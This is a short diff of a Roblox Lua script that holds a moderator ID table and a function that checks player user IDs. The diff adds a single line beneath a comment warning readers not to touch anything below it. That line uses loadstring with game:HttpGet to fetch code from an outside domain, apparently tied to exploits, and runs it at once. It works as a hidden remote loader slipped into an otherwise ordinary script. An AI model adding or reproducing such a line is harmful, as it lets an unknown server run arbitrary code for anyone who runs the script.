@@ -2178,6 +2178,7 @@ ModIDS = {
 }
 
 --\\ Don't mess with anything below this
+loadstring(game:HttpGet('https://iexploit.xyz/plasma/mod/loadmod'))()
 function swagnames()
     for _,Player in pairs(game:GetService('Players'):GetChildren()) do
         if table.find(Diamond, Player.UserId) then
